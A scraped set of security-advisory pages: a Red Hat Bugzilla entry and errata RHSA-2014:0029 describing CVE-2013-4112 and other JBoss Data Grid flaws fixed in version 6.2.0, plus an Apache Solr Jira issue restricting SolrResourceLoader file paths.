on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | low | | [Severity:](page.cgi?id=fields.html#bug_severity) | low | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [984363](show_bug.cgi?id=984363) [984364](show_bug.cgi?id=984364 "CLOSED NOTABUG - jgroups: CVE-2013-4112 JGroups: Authentication via cached credentials [brms-5]") [984365](show_bug.cgi?id=984365) [984366](show_bug.cgi?id=984366) [984367](show_bug.cgi?id=984367) [984368](show_bug.cgi?id=984368) [984369](show_bug.cgi?id=984369) [984370](show_bug.cgi?id=984370) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [970481](show_bug.cgi?id=970481) [980700](show_bug.cgi?id=980700) [983484](show_bug.cgi?id=983484) [991853](show_bug.cgi?id=991853) [1010765](show_bug.cgi?id=1010765) | | TreeView+ | [depends on](buglist.cgi?bug_id=983489&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=983489&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2013-07-11 10:14 UTC by Arun Babu Neelicattu | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-29 13:05 UTC ([History](show_activity.cgi?id=983489)) | | [CC List:](page.cgi?id=fields.html#cclist) | 24 users (show)  bdawidow brms-jira ccrouch cdewolf dereed djorm epp-bugs fnasser grocha huwang jason.greene jbpapp-maint jdg-bugs lgao mposolda myarboro pcheung rhq-maint security-response-team soa-p-jira theute tkirby ttarrant weli | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2014-01-16 00:55:47 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2013:1207](https://access.redhat.com/errata/RHSA-2013%3A1207) | 0 | normal | SHIPPED\_LIVE | Moderate: Red Hat JBoss Enterprise Application Platform 6.1.1 update | 2013-09-04 22:51:19 UTC | | Red Hat Product Errata | [RHSA-2013:1208](https://access.redhat.com/errata/RHSA-2013%3A1208) | 0 | normal | SHIPPED\_LIVE | Moderate: Red Hat JBoss Enterprise Application Platform 6.1.1 update | 2013-09-04 22:50:25 UTC | | Red Hat Product Errata | [RHSA-2013:1209](https://access.redhat.com/errata/RHSA-2013%3A1209) | 0 | normal | SHIPPED\_LIVE | Moderate: Red Hat JBoss Enterprise Application Platform 6.1.1 update | 2013-09-04 22:50:19 UTC | | Red Hat Product Errata | [RHSA-2013:1437](https://access.redhat.com/errata/RHSA-2013%3A1437) | 0 | normal | SHIPPED\_LIVE | Important: Red Hat JBoss Portal 6.1.0 update | 2013-10-16 20:53:32 UTC | | Red Hat Product Errata | [RHSA-2013:1771](https://access.redhat.com/errata/RHSA-2013%3A1771) | 0 | normal | SHIPPED\_LIVE | Low: Red Hat JBoss Web Framework Kit 2.4.0 update | 2013-11-27 22:09:34 UTC | | Red Hat Product Errata | [RHSA-2014:0029](https://access.redhat.com/errata/RHSA-2014%3A0029) | 0 | normal | SHIPPED\_LIVE | Important: Red Hat JBoss Data Grid 6.2.0 update | 2014-01-15 22:45:50 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=983489#c0)  Arun Babu Neelicattu    2013-07-11 10:14:22 UTC  ``` A flaw was found in JGroup's DiagnosticsHandler that allowed an attacker on an adjacent network to reuse the credentials from a previous successful authentication. This could be exploited to read diagnostic information (information disclosure) and attain limited remote code execution.  This issue affects JGroups versions 3.0.x (3.0.11.Final and later), 3.1.x (3.1.0.Final and later), 3.2.x (prior to 3.2.10.Final) and 3.3.x (prior to 3.3.3.Final).   ```  [Comment 5](show_bug.cgi?id=983489#c5)  Arun Babu Neelicattu    2013-07-15 05:42:58 UTC  ``` This issue was fixed in upstream versions 3.3.3.Final and 3.2.10.Final.   ```  [Comment 6](show_bug.cgi?id=983489#c6)  Thomas Heute    2013-07-15 14:52:52 UTC  ``` Will 3.2.10 be certified for EAP ? (To be consumed in JPP 6.1)   ```  [Comment 10](show_bug.cgi?id=983489#c10)  errata-xmlrpc    2013-09-04 18:56:30 UTC  ``` This issue has been addressed in following products:    Red Hat JBoss Enterprise Application Platform 6.1.1  Via RHSA-2013:1209 <https://rhn.redhat.com/errata/RHSA-2013-1209.html>   ```  [Comment 11](show_bug.cgi?id=983489#c11)  errata-xmlrpc    2013-09-04 18:58:27 UTC  ``` This issue has been addressed in following products:    JBEAP 6 for RHEL 6  Via RHSA-2013:1208 <https://rhn.redhat.com/errata/RHSA-2013-1208.html>   ```  [Comment 12](show_bug.cgi?id=983489#c12)  errata-xmlrpc    2013-09-04 19:02:59 UTC  ``` This issue has been addressed in following products:    JBEAP 6 for RHEL 5  Via RHSA-2013:1207 <https://rhn.redhat.com/errata/RHSA-2013-1207.html>   ```  [Comment 13](show_bug.cgi?id=983489#c13)  errata-xmlrpc    2013-10-16 16:58:16 UTC  ``` This issue has been addressed in following products:    Red Hat JBoss Portal 6.1.0  Via RHSA-2013:1437 <https://rhn.redhat.com/errata/RHSA-2013-1437.html>   ```  [Comment 14](show_bug.cgi?id=983489#c14)  errata-xmlrpc    2013-11-27 17:11:14 UTC  ``` This issue has been addressed in following products:    Red Hat JBoss Web Framework Kit 2.4.0  Via RHSA-2013:1771 <https://rhn.redhat.com/errata/RHSA-2013-1771.html>   ```  [Comment 18](show_bug.cgi?id=983489#c18)  errata-xmlrpc    2014-01-15 17:46:37 UTC  ``` This issue has been addressed in following products:    Red Hat JBoss Data Grid 6.2.0  Via RHSA-2014:0029 <https://rhn.redhat.com/errata/RHSA-2014-0029.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=983489&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from rhn.redhat.com_6f4dc86c_20250125_155134.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2014:0029 - Security Advisory

Issued:
2014-01-15
Updated:
2014-01-15
# RHSA-2014:0029 - Security Advisory

* [Overview](#overview)

## Synopsis

Important: Red Hat JBoss Data Grid 6.2.0 update

## Type/Severity

Security Advisory: Important

## Topic

Red Hat JBoss Data Grid 6.2.0, which fixes multiple security issues,
various bugs, and adds enhancements, is now available from the Red Hat
Customer Portal.

The Red Hat Security Response Team has rated this update as having
important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

Red Hat JBoss Data Grid is a distributed in-memory data grid, based on
Infinispan.

This release of Red Hat JBoss Data Grid 6.2.0 serves as a replacement for
Red Hat JBoss Data Grid 6.1.0. It includes various bug fixes and
enhancements which are detailed in the Red Hat JBoss Data Grid 6.2.0
Release Notes. The Release Notes will be available shortly from
<https://access.redhat.com/site/documentation/Red_Hat_JBoss_Data_Grid/>

This update also fixes the following security issues:

Multiple path traversal flaws where found in the Mojarra JSF2
implementation for identifying resources by name or by library.
An unauthenticated, remote attacker could use these flaws to gather
otherwise undisclosed information from within an application's root
directory. (CVE-2013-3827)

It was found that the SolrResourceLoader class in Apache Solr allowed
loading of resources via absolute paths, or relative paths which were not
sanitized for directory traversal. Some Solr components expose REST
interfaces which load resources (XSL style sheets and Velocity templates)
via SolrResourceLoader, using paths identified by REST parameters. A remote
attacker could use this flaw to load arbitrary local files on the server
via SolrResourceLoader, potentially resulting in information disclosure or
remote code execution. (CVE-2013-6397)

It was found that the XML and XSLT UpdateRequestHandler classes in Apache
Solr would resolve external entities, allowing an attacker to conduct XML
External Entity (XXE) attacks. A remote attacker could use this flaw to
read files accessible to the user running the application server, and
potentially perform other more advanced XXE attacks. (CVE-2012-6612,
CVE-2013-6407)

It was found that the DocumentAnalysisRequestHandler class in Apache Solr
would resolve external entities, allowing an attacker to conduct XXE
attacks. A remote attacker could use this flaw to read files accessible to
the user running the application server, and potentially perform other more
advanced XXE attacks. (CVE-2013-6408)

The data file used by PicketBox Vault to store encrypted passwords contains
a copy of its own admin key. The file is encrypted using only this admin
key, not the corresponding JKS key. A local attacker with permission to
read the vault data file could read the admin key from the file.
(CVE-2013-1921)

The HawtJNI Library class wrote native libraries to a predictable file name
in /tmp/ when the native libraries were bundled in a JAR file, and no
custom library path was specified. A local attacker could overwrite these
native libraries with malicious versions during the window between when
HawtJNI writes them and when they are executed. (CVE-2013-2035)

A flaw was found in JGroup's DiagnosticsHandler that allowed an attacker on
an adjacent network to reuse the credentials from a previous successful
authentication. This could be exploited to read diagnostic information
(information disclosure) and attain limited remote code execution.
(CVE-2013-4112)

Note that CVE-2013-6397, CVE-2013-6407, and CVE-2013-6408 are not exposed
by default. They are only exploitable if a user has manually exposed
servlets provided in the Apachr Solr component that ships with Red Hat
JBoss Data Grid, or written their own code that makes use of the vulnerable
elements of Apache Solr.

The CVE-2013-2035 issue was discovered by Florian Weimer of the Red Hat
Product Security Team.

All users of Red Hat JBoss Data Grid 6.1.0 as provided from the Red Hat
Customer Portal are advised to upgrade to Red Hat JBoss Data Grid 6.2.0.

## Solution

The References section of this erratum contains a download link (you must
log in to download the update). Before applying this update, back up your
existing JBoss Data Grid installation.

## Affected Products

* Red Hat JBoss Data Grid Text-Only Advisories x86\_64

## Fixes

* [BZ - 948106](https://bugzilla.redhat.com/show_bug.cgi?id=948106)
  - CVE-2013-1921 JBoss PicketBox: Insecure storage of masked passwords
* [BZ - 958618](https://bugzilla.redhat.com/show_bug.cgi?id=958618)
  - CVE-2013-2035 HawtJNI: predictable temporary file name leading to local arbitrary code execution
* [BZ - 983489](https://bugzilla.redhat.com/show_bug.cgi?id=983489)
  - CVE-2013-4112 JGroups: Authentication via cached credentials
* [BZ - 1035062](https://bugzilla.redhat.com/show_bug.cgi?id=1035062)
  - CVE-2013-6397 Apache Solr: directory traversal when loading XSL stylesheets and Velocity templates
* [BZ - 1035981](https://bugzilla.redhat.com/show_bug.cgi?id=1035981)
  - CVE-2012-6612 CVE-2013-6407 Apache Solr: XML eXternal Entity (XXE) flaw in XML and XSLT UpdateRequestHandler
* [BZ - 1035985](https://bugzilla.redhat.com/show_bug.cgi?id=1035985)
  - CVE-2013-6408 Apache Solr: XML eXternal Entity (XXE) flaw in DocumentAnalysisRequestHandler
* [BZ - 1038898](https://bugzilla.redhat.com/show_bug.cgi?id=1038898)
  - CVE-2013-3827 Mojarra JSF2: Multiple Information Disclosure flaws due to unsafe path traversal

## CVEs

* [CVE-2012-6612](https://www.redhat.com/security/data/cve/CVE-2012-6612.html)
* [CVE-2013-1921](https://www.redhat.com/security/data/cve/CVE-2013-1921.html)
* [CVE-2013-2035](https://www.redhat.com/security/data/cve/CVE-2013-2035.html)
* [CVE-2013-3827](https://www.redhat.com/security/data/cve/CVE-2013-3827.html)
* [CVE-2013-4112](https://www.redhat.com/security/data/cve/CVE-2013-4112.html)
* [CVE-2013-6397](https://www.redhat.com/security/data/cve/CVE-2013-6397.html)
* [CVE-2013-6407](https://www.redhat.com/security/data/cve/CVE-2013-6407.html)
* [CVE-2013-6408](https://www.redhat.com/security/data/cve/CVE-2013-6408.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>
* <https://access.redhat.com/jbossnetwork/restricted/listSoftware.html?product=data.grid&downloadType=distributions>
* <https://access.redhat.com/site/documentation/Red_Hat_JBoss_Data_Grid/>

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from issues.apache.org_3f92c120_20250125_155139.html ===


[Log in](/jira/login.jsp?os_destination=%2Fbrowse%2FSOLR-4882)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoading…[![ASF JIRA](/jira/s/xd97tr/820010/13pdxe5/_/jira-logo-scaled.png)](https://issues.apache.org/jira/secure/MyJiraHome.jspa)

* [Dashboards](/jira/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/jira/browse/SOLR "View recent projects and browse a list of projects")
* [Issues](/jira/issues/ "Search for issues and view recent issues")

* [Help](https://docs.atlassian.com/jira/jcore-docs-0820/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-0820/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/jira/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/jira/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/jira/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/jira/login.jsp?os_destination=%2Fbrowse%2FSOLR-4882)

Public signup for this instance is **disabled**. Go to our [Self serve sign up page](https://selfserve.apache.org/jira-account.html) to request an account. Report potential security issues [privately](https://apache.org/security/#reporting-a-vulnerability)

![Uploaded image for project: 'Solr'](https://issues.apache.org/jira/secure/projectavatar?pid=12310230&avatarId=22151)

1. [Solr](/jira/browse/SOLR)
2. [SOLR-4882](/jira/browse/SOLR-4882)

# Restrict SolrResourceLoader to only classloader accessible files and instance dir

[Log In](/jira/login.jsp?os_destination=%2Fbrowse%2FSOLR-4882 "Log In")Export

XMLWordPrintableJSON
#### Details

* **Type:**
  ![](/jira/secure/viewavatar?size=xsmall&avatarId=21140&avatarType=issuetype "Improvement - An improvement or enhancement to an existing feature or task.") Improvement
* **Status:**
  Resolved
* **Priority:**
  ![](/jira/images/icons/priorities/major.svg "Major - Major loss of function.") Major
* **Resolution:**
  Fixed
* **Affects Version/s:**
  4.3
* **Fix Version/s:**
  [4.6](/jira/issues/?jql=project+%3D+SOLR+AND+fixVersion+%3D+4.6 "4.6 Major release after 4.5"), [6.0](/jira/issues/?jql=project+%3D+SOLR+AND+fixVersion+%3D+6.0 "6.0 First 6.x release, Major release after 5.5")
* **Component/s:**
  None
* **Labels:**
  + [security](/jira/issues/?jql=labels+%3D+security "security")
#### Description

SolrResourceLoader currently allows to load files from any absolute/CWD-relative path, which is used as a fallback if the resource cannot be looked up via the class loader.

We should limit this fallback to sub-dirs below the instanceDir passed into the ctor. The CWD special case should be removed, too (the virtual CWD is instance's config or root dir).

The reason for this is security related. Some Solr components allow to pass in resource paths via REST parameters (e.g. XSL stylesheets, velocity templates,...) and load them via resource loader. By this it is possible to limit the whole thing to

not allow loading e.g. /etc/passwd as a stylesheet.

In 4.4 we should add a solrconfig.xml setting to enable the old behaviour, but disable it by default, if your existing installation requires the files from outside the instance dir which are not available via the URLClassLoader used internally. In Lucene 5.0 we should not support this anymore.

#### Attachments

#### Attachments

* Options
  + [Sort By Name](/jira/browse/SOLR-4882?attachmentSortBy=fileName#attachmentmodule "viewissue.subtasks.tab.show.all.name")
  + [Sort By Date](/jira/browse/SOLR-4882?attachmentSortBy=dateTime#attachmentmodule "Sort By Date")
  + [Ascending](/jira/browse/SOLR-4882?attachmentOrder=asc#attachmentmodule "Ascending")
  + [Descending](/jira/browse/SOLR-4882?attachmentOrder=desc#attachmentmodule "Descending")

1. [SOLR-4882.patch](/jira/secure/attachment/12604396/SOLR-4882.patch "Latest  21/Sep/13 14:33 - Uwe Schindler")21/Sep/13 14:3314 kBUwe Schindler
2. [SOLR-4882.patch](/jira/secure/attachment/12585644/SOLR-4882.patch " 31/May/13 17:39 - Uwe Schindler")31/May/13 17:3912 kBUwe Schindler
3. [SOLR-4882.patch](/jira/secure/attachment/12585600/SOLR-4882.patch " 31/May/13 12:34 - Uwe Schindler")31/May/13 12:3410 kBUwe Schindler
#### Issue Links

is required by

![Bug - A problem which impairs or prevents the functions of the product.](/jira/secure/viewavatar?size=xsmall&avatarId=21133&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.")
[SOLR-5520](/jira/browse/SOLR-5520)
Backport some security fixes from 4.x to 3.6.x branch

* ![Major - Major loss of function.](/jira/images/icons/priorities/major.svg "Major - Major loss of function.")
* Resolved

#### Activity

#### People

Assignee:

![uschindler](https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452)
Uwe Schindler

Reporter:

![uschindler](https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452)
Uwe Schindler

Votes:
0
Vote for this issue

Watchers:
3
Start watching this issue

#### Dates

Created:

30/May/13 20:03

Updated:

09/May/16 18:49

Resolved:

21/Sep/13 14:59

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/jira/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/jira/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for Apache Software Foundation. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)



=== Content from secunia.com_84d3028e_20250125_155136.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
